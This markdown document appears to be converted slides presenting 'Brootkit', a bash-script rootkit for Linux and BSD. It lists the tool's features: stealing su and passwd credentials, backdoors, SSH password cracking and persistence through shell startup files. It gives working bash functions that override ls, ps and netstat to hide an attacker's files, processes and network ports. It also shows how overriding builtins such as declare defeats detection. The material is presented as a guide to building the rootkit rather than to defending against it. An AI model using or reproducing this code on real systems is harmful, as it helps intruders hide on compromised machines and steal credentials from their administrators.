# Shell Hacking

## Overview
When controlling a Unix-like system, the following steps and techniques can be used to manipulate and hide files, processes, and network connections using shell scripts.

### Example: Compiling a Rootkit
```bash
[root@localhost fucking_rootkit]# ls
Makefile furootkit.c

[root@localhost fucking_rootkit]# make
make -C /lib/modules/2.6.32/build M=/root/lkm/fucking_rootkit modules
make: *** /lib/modules/2.6.32/build: No such file or directory.  Stop.
make: *** [furootkit] Error 2

[root@localhost fucking_rootkit]# gcc
bash: gcc: command not found

[root@localhost fucking_rootkit]# perl
bash: perl: command not found

[root@localhost fucking_rootkit]# python
bash: python: command not found
```

### Principles of Shell Scripting
- **Unix KISS Philosophy**
  - Keep it simple, stupid.
  - Do one thing and do it well.
- **Goals of Shell Scripts**
  - No CPU architecture dependency.
  - No compiler dependency.
  - No interpreter dependency.
  - No OS or kernel distribution dependency.
  - Compatible with `sh`, `bash`, `csh`, `zsh`.
  - Works on `Unix`, `BSD`, `Solaris`, `Linux`.
  - Utilize hundreds of open-source tools.
  - Just a shell script?

## Bash Rootkit

### History of Bash Rootkits
- If bash shell scripts can be designed for security tools like `chkrootkit` or `rkhunter`, they can also be implemented as rootkits.

### Brootkit
- **Lightweight rootkit** implemented using bash shell scripts.
- **Features:**
  1. Enhanced hiding capabilities against administrators or HIDS.
  2 - Steal `su` and `passwd` credentials.
  3. Hide files and directories.
  4. Hide processes.
  5. Hide network connections.
  6. Establish a backdoor connection.
  7. Multi-threaded port scanner.
  8. HTTP download functionality.
  9. Multi-threaded SSH password cracker.
- **Target OS:**
  1. CentOS
  2. RHEL
  3. Ubuntu
  4. Debian
  5. Fedora
  6. FreeBSD

### The Life of `ls`
- `ls` -> `glibc/opendir()` -> `syscall/sys_getdents()` -> `vfs/vfs_readdir()` -> `ext4/ext4_readdir()`
- **Preload and Hooking:**
  - Preload libraries to hook into system calls.
  - Hijack VFS (Virtual File System).
  - Inline hooking.

### Next Steps
- `ls` -> `bash` -> `shell function` -> `builtin` -> `hashtable` -> `$PATH` -> `command_not_found_handle/exit`
- **Override Shell Function:**
```bash
[root@localhost brootkit]# ls
README.md bashproxy.sh brbomb.sh brget.sh brsh.conf brshrootkit.sh install.sh passwd1.lst sshcrack.sh ubd.sh bashbd.sh bashtn.sh brconfig.sh brootkit.sh brshconfig.sh cronbd.sh pass.lst passwd2.lst sshcrack1.exp uninstall.sh bashnc.sh br.conf brdaemon.sh brscan.sh brshinstall.sh host.lst passwd.lst sshcrack.exp sshcrack2.exp user.lst

[root@localhost brootkit]# function ls() { echo "hjacked?"; }
[root@localhost brootkit]# ls
hjacked?

[root@localhost brootkit]# /bin/ls
README.md bashproxy.sh brbomb.sh brget.sh brsh.conf brshrootkit.sh install.sh passwd1.lst sshcrack.sh ubd.sh bashbd.sh bashtn.sh brconfig.sh brootkit.sh brshconfig.sh cronbd.sh pass.lst passwd2.lst sshcrack1.exp uninstall.sh bashnc.sh br.conf brdaemon.sh brscan.sh brshinstall.sh host.lst passwd.lst sshcrack.exp sshcrack2.exp user.lst

[root@localhost brootkit]# function /bin/ls() { echo "hjacked again?"; }
[root@localhost brootkit]# /bin/ls
hjacked again?
```

### Troubleshooting `ls` Output Format
- **Complex Pseudo-Implementation:**
  - Handle common arguments (e.g., `ls -alt`).
  - Adjust for terminal window size.
  - Manage bash character colors.

### Hiding Files and Directories
```bash
fake_file=$(ls $@)
old_ifs=$IFS; IFS=","
for hide_file in "${br_hide_file[@]}"; do
  fake_file=$(echo "$fake_file" | sed -e '/'$hide_file'/d')
done
IFS=$old_ifs
echo "$fake_file"
```

### Hiding Processes
```bash
function ps() {
  old_ifs=$IFS; IFS=","
  proc_name=$(/bin/ps $@)
  for hide_proc in "${br_hide_proc[@]}"; do
    proc_name=$(echo "$proc_name" | sed -e '/'$hide_proc'/d')
  done
  echo "$proc_name"
  IFS=$old_ifs
}
```

### Hiding TCP Connections
```bash
function netstat() {
  local hide_port tmp_port old_ifs
  . $BR_ROOTKIT_PATH/brconfig.sh
  br_load_config $BR_ROOTKIT_PATH/br.conf
  old_ifs=$IFS; IFS=","
  tmp_port=$(/bin/netstat $@)
  for hide_port in "${br_hide_port[@]}"; do
    tmp_port=$(echo "$tmp_port" | sed -e '/'$hide_port'/d')
  done
  echo "$tmp_port"
  IFS=$old_ifs
}
```

### Real-World Considerations
- **Multiple Consoles:** `screen`, `bash*n`
- **Single User:** `~/.bashrc`, `~/.bash_profile`
- **All Users:** `/home/*`, `/etc/bashrc`, `/etc/bash_profile`
- **Reboot Persistence**

### Anti-Detection Techniques
- **Detecting Overridden Functions:**
```bash
[root@localhost brootkit]# declare -f
/bin/ls () {
  echo "hjacked again?"
}
ls () {
  echo "hjacked?"
}

[root@localhost brootkit]# set | tail
consoletype=pty
tmpid=0
/bin/ls () {
  echo "hjacked again?"
}
ls () {
  echo "hjacked?"
}
```

### Anti-Anti-Detection
- **Overriding Builtins:**
```bash
[root@localhost brootkit]# declare() { echo "hijack declare"; }
[root@localhost brootkit]# declare
hijack declare

[root@localhost brootkit]# builtin declare -f
/bin/ls () {
  echo "hjacked again?"
}
ls () {
  echo "hjacked?"
}
```

This document provides a comprehensive overview of shell hacking, focusing on the creation and implementation of a bash rootkit.